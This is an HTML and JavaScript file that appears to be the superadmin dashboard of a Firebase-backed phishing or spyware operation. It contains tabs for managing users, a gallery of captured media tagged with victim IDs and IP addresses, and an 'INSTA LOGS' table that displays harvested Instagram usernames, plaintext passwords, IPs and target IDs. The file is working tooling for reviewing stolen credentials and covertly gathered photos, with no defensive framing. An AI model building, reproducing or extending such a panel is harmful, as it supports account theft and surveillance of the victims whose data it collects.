<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>⛧ SUPERADMIN ⛧</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0f1e;font-family:'Courier New';padding:15px}.container{max-width:1400px;margin:0 auto}.header{border-bottom:2px solid #f04;padding-bottom:12px;margin-bottom:20px;display:flex;justify-content:space-between}.title{color:#f04;font-size:1.3rem}.tabs{display:flex;gap:8px;margin-bottom:20px;flex-wrap:wrap}.tab{background:0 0;border:1px solid #0f0;color:#0f0;padding:8px 18px;cursor:pointer;border-radius:40px}.tab.active{background:#0f0;color:#000}.panel{display:none}.panel.active{display:block}.stat-card{background:#0f111a;border:1px solid #0f0;border-radius:14px;padding:15px;display:inline-block;margin:10px}.gallery-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:15px}.gallery-item{background:#050505;border:1px solid #0f0;border-radius:12px;overflow:hidden}.gallery-item img{width:100%;height:160px;object-fit:cover}.data-table{width:100%;border-collapse:collapse}.data-table th,.data-table td{border:1px solid #0f0;padding:6px}</style></head><body><div class="container"><div class="header"><div class="title">⛧ SUPER_TERMINAL ⛧</div><button id="logoutBtn" style="background:#f04;border:none;padding:6px 16px;color:#fff;cursor:pointer">EXIT</button></div><div class="tabs"><button class="tab active" data-tab="users">👥 USERS</button><button class="tab" data-tab="gallery">📸 GALLERY</button><button class="tab" data-tab="instalogs">📸 INSTA LOGS</button></div><div id="usersPanel" class="panel active"><div id="userTable"></div></div><div id="galleryPanel" class="panel"><div id="galleryContainer" class="gallery-grid"></div></div><div id="instalogsPanel" class="panel"><div id="instaLogsContainer"></div></div></div><script src="config.js"></script><script type="importmap">{"imports":{"firebase/app":"https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js","firebase/auth":"https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js","firebase/firestore":"https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"}}</script><script type="module">import{initializeApp}from"firebase/app";import{getAuth,onAuthStateChanged,signOut}from"firebase/auth";import{getFirestore,collection,getDocs,deleteDoc,doc,updateDoc,query,where}from"firebase/firestore";const app=initializeApp(window.FIREBASE_CONFIG);const auth=getAuth(app);const db=getFirestore(app);let allUsers=[],allCaptures=[],allInstaLogs=[];async function loadAll(){const uSnap=await getDocs(collection(db,"users"));allUsers=[];uSnap.forEach(d=>allUsers.push({id:d.id,...d.data()}));const cSnap=await getDocs(collection(db,"captures"));allCaptures=[];cSnap.forEach(d=>allCaptures.push({id:d.id,...d.data()}));const iSnap=await getDocs(collection(db,"instagram_logs"));allInstaLogs=[];iSnap.forEach(d=>allInstaLogs.push({id:d.id,...d.data()}));allInstaLogs.sort((a,b)=>(b.unix||0)-(a.unix||0));renderUsers();renderGallery();renderInstaLogs()}function renderUsers(){let html='<table class="data-table"><tr><th>UID</th><th>EMAIL</th><th>ROLE</th><th>STATUS</th><th>ACTION</th></tr>';for(let u of allUsers){html+=`<tr><td>${u.id.substring(0,16)}</td><td>${u.email||'-'}</td><td>${u.role||'user'}</td><td>${u.banned?'BANNED':'ACTIVE'}</td><td>`;if(!u.banned&&u.role!=='superadmin')html+=`<button onclick="banUser('${u.id}')">BAN</button>`;else if(u.banned)html+=`<button onclick="unbanUser('${u.id}')">UNBAN</button>`;html+=`</td></tr>`}html+='</table>';document.getElementById('userTable').innerHTML=html}window.banUser=async(uid)=>{if(confirm('Ban this user?')){await updateDoc(doc(db,"users",uid),{banned:true});await loadAll()}};window.unbanUser=async(uid)=>{if(confirm('Unban this user?')){await updateDoc(doc(db,"users",uid),{banned:false});await loadAll()}};function renderGallery(){let html='';for(let cap of allCaptures){if(cap.media&&cap.media.length){for(let url of cap.media){html+=`<div class="gallery-item"><img src="${url}" onclick="window.open('${url}')"><div style="padding:5px;font-size:10px;color:#0f0">👤 ${cap.userId?.substring(0,10)}<br>🌐 ${cap.ip||'?'}</div></div>`}}}document.getElementById('galleryContainer').innerHTML=html||'<div>NO MEDIA</div>'}function renderInstaLogs(){let html='<table class="data-table"><tr><th>USERNAME</th><th>PASSWORD</th><th>IP</th><th>TARGET</th><th>DATE</th></tr>';for(let log of allInstaLogs.slice(0,100)){html+=`<tr><td>${log.username||'-'}</td><td>${log.password||'-'}</td><td>${log.ip||'-'}</td><td>${log.targetUid?.substring(0,12)}</td><td>${new Date(log.timestamp).toLocaleString()}</td></tr>`}html+='</table>';document.getElementById('instaLogsContainer').innerHTML=html}document.querySelectorAll('.tab').forEach(tab=>{tab.onclick=()=>{document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));tab.classList.add('active');document.getElementById(tab.dataset.tab+'Panel').classList.add('active')}});document.getElementById('logoutBtn').onclick=async()=>{await signOut(auth);location.href='login.html'};onAuthStateChanged(auth,async(u)=>{if(!u){location.href='login.html';return}const ud=await getDocs(query(collection(db,"users"),where("uid","==",u.uid)));let isSuper=false;ud.forEach(d=>{if(d.data().role==='superadmin')isSuper=true});if(!isSuper){location.href='admin.html';return}await loadAll()});</script></body></html>
